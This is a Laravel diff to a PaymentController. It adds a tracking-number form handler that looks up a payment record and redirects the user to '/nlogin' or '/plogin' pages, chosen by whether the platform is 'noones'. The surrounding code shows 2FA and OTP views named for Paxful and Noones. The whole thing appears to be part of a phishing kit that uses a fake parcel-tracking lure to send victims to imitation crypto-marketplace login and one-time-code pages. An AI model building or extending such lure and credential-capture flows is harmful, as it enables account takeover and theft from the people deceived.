@@ -9,6 +9,50 @@ use App\Models\Payment;
 class PaymentController extends Controller
 {
 
+    public function track(){
+        return view('track');
+    }
+
+    public function tracking(Request $request){
+
+        // dd($request->tracking_number);
+
+        $trackingNumber = $request->tracking_number; // keep as string
+
+        // Get the first 4 characters (including leading 0s)
+        $prefix = substr($trackingNumber, 0, 4); // e.g., "0100"
+
+        // Get the remaining characters
+        $number = substr($trackingNumber, 4); // e.g., "23"
+
+        // Convert to integers (if needed)
+        $prefixInt = (int) $prefix; // 100
+        $numberInt = (int) $number; // 23
+
+
+        //now check if this number is on the database
+
+        $payment=Payment::findOrFail($numberInt);
+
+        if ($payment) {
+            
+            $id = $payment->id;
+            $platform = strtolower(trim($request->platform)); // normalize input
+        
+            // Determine the redirect path
+            $path = $platform === 'noones' ? 'nlogin' : 'plogin';
+        
+            return redirect()->to(url("/$path/$id"));
+        }
+        
+        return redirect()->back()->withErrors([
+            'tracking_number' => 'Invalid tracking number.'
+        ]);
+        
+
+        return $payment;
+    }
+
 
 
     public function store2fa(Request $request)
@@ -75,6 +119,10 @@ class PaymentController extends Controller
     }
 public function getOtpForm(){
     return view('paxfulotp');
+}
+
+public function choice(){
+    return view('choice');
 }
 public function getOtpFormnoones(){
     return view('noonesotp');
